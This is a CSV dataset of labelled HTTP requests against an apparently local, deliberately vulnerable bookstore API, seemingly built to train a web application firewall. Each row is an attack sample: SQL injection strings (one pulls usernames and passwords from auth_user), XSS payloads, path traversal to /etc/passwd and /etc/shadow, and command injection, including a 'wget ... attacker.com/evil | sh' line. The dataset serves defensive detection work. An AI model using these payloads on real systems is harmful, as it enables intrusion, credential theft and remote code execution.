method,path,query_params,headers,body,client_ip,user_agent,label,attack_type
GET,/api/v1/vulnerable/files/download/,file=C:\windows\system32\calc.exe,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.105,Wget/1.21.3,3,PATH
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""' anD 1=2--"", ""password"": ""admin123""}",203.0.113.45,Wget/1.21.3,1,SQLI
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""' OR 1=1/*"", ""password"": ""admin123""}",172.16.4.12,curl/8.4.0,1,SQLI
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""1 UNION SELECT 1, sqlite_version(), 3, 4--"", ""password"": ""123456""}",203.0.113.45,Nikto/2.1.6,1,SQLI
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""' OR ''='"", ""password"": """"}",203.0.113.45,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",1,SQLI
GET,/static//etc/passwd,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,172.16.4.12,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),3,PATH
GET,/orders/14/invoice.pdf,template=C:\windows\system32\calc.exe,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.200,Nikto/2.1.6,3,PATH
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1&& uname -a""}",198.51.100.23,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",4,CMD
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""' OR 'a' LIKE 'a"", ""password"": """"}",192.168.1.105,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",1,SQLI
GET,/static/../../../../proc/self/environ,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,198.51.100.23,Wget/1.21.3,3,PATH
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1|| c'a't /etc/passwd""}",192.168.1.151,Go-http-client/1.1,4,CMD
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 19, ""rating"": 5, ""review_text"": ""Sách hay! \"" onmouseover=\""alert(1)\""""}",192.168.1.210,sqlmap/1.7.11#stable (https://sqlmap.org),2,XSS
GET,/api/v1/vulnerable/books/search/,q='/**/OR/**/''=',"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.4.12,Wget/1.21.3,1,SQLI
GET,/api/v1/vulnerable/books/search/,q=' OR 'a' LIKE 'a,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,198.51.100.23,Wget/1.21.3,1,SQLI
GET,/books/,"category=1 UNION SELECT 1, sqlite_version(), 3, 4--","{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.88,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),1,SQLI
GET,/api/v1/vulnerable/reviews/,book_id=<script>alert(1)</script>,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.200,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,XSS
GET,/orders/14/invoice.pdf,template=%252e%252e%252f%252e%252e%252fetc/shadow,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,198.51.100.23,Go-http-client/1.1,3,PATH
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 2, ""rating"": 5, ""review_text"": ""Sách hay! <img src='invalid' onerror='alert(\""XSS\"")'>""}",192.168.1.200,Go-http-client/1.1,2,XSS
GET,/api/v1/vulnerable/files/download/,file=..\..\..\..\boot.ini,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.88,Nikto/2.1.6,3,PATH
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; wget -qO- http://attacker.com/evil | sh""}",10.0.0.88,curl/8.4.0,4,CMD
GET,/api/v1/vulnerable/reviews/,book_id=javascript:alert(document.domain),"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.5.55,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,2,XSS
GET,/orders/17/invoice.pdf,template=../../../../proc/self/environ,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.151,sqlmap/1.7.11#stable (https://sqlmap.org),3,PATH
GET,/static//etc/passwd,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,203.0.113.45,Wget/1.21.3,3,PATH
GET,/static/C:\windows\system32\calc.exe,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.152,sqlmap/1.7.11#stable (https://sqlmap.org),3,PATH
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""\"" onmouseover=\""alert(1)\"""", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""\"" onmouseover=\""alert(1)\""""}",198.51.100.77,Wget/1.21.3,2,XSS
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1%26%20systeminfo""}",198.51.100.23,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,4,CMD
GET,/api/v1/vulnerable/files/download/,file=../../../../boot.ini%00.pdf,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.105,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",3,PATH
GET,/api/v1/vulnerable/files/download/,file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.210,Nikto/2.1.6,3,PATH
GET,/orders/14/invoice.pdf,template=..//..//..//..//..//..//..//..//etc/passwd,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,198.51.100.77,Nikto/2.1.6,3,PATH
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1&& uname -a""}",192.168.1.200,Wget/1.21.3,4,CMD
GET,/api/v1/vulnerable/books/search/,"q=1+UNION+SELECT+1,+sqlite_version(),+3,+4--","{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,203.0.113.45,Go-http-client/1.1,1,SQLI
GET,/orders/17/invoice.pdf,template=..\..\..\windows\system32\drivers\etc\hosts,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.210,Go-http-client/1.1,3,PATH
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""'/**/UN/**/ION/**/SE/**/LECT/**/null,/**/username,/**/password,/**/null/**/FROM/**/auth_user--"", ""password"": ""123456""}",192.168.1.151,python-requests/2.31.0,1,SQLI
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; $(i''d)""}",172.16.5.55,Wget/1.21.3,4,CMD
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1& $(systeminfo)""}",192.168.1.152,Wget/1.21.3,4,CMD
GET,/api/v1/vulnerable/files/download/,file=..//..//..//..//..//..//..//..//var/log/syslog,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.200,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),3,PATH
GET,/static/../../../../proc/self/environ,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.99,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),3,PATH
GET,/api/v1/vulnerable/books/search/,q='/**/AND/**/1=2--,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.210,Nikto/2.1.6,1,SQLI
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 24, ""rating"": 5, ""review_text"": ""Sách hay! <body onload=alert('XSS')>""}",192.168.1.210,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",2,XSS
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 49, ""rating"": 5, ""review_text"": ""Sách hay! '/onfocus='alert(1)'""}",172.16.5.55,python-requests/2.31.0,2,XSS
GET,/books/,category='; SELECT pg_sleep(5);--,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.99,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,1,SQLI
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""' OR 1=1 --"", ""password"": ""123456""}",192.168.1.200,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),1,SQLI
GET,/api/v1/vulnerable/files/download/,file=../../../../proc/self/environ,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,203.0.113.45,curl/8.4.0,3,PATH
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 13, ""rating"": 5, ""review_text"": ""Sách hay! <video src=1 OnERror=aLERt(1)>""}",192.168.1.152,Nikto/2.1.6,2,XSS
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""') oR ('1'='1"", ""password"": ""password""}",192.168.1.105,Wget/1.21.3,1,SQLI
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>""}",198.51.100.77,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",2,XSS
GET,/api/v1/vulnerable/reviews/,"book_id=<img src='invalid' onloadendend='alert(""XSS"")'>","{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.150,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,2,XSS
GET,/static/....//....//data/waf_security.db,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.200,sqlmap/1.7.11#stable (https://sqlmap.org),3,PATH
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""sqlmap/1.7.11#stable (https://sqlmap.org)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""' onfocus='alert(1)'"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""' onfocus='alert(1)'""}",192.168.1.200,sqlmap/1.7.11#stable (https://sqlmap.org),2,XSS
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<input type='text' autofocus onfocus=alerT(1)>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<input type='text' autofocus onfocus=alerT(1)>""}",192.168.1.150,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,XSS
GET,/books/,category=admin'/*,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,172.16.5.55,Nikto/2.1.6,1,SQLI
GET,/api/v1/vulnerable/reviews/,book_id=<input type='text' autofocus onfocus=alert(1)>,"{""Host"": ""localhost:8000"", ""User-Agent"": ""curl/8.4.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,10.0.0.88,curl/8.4.0,2,XSS
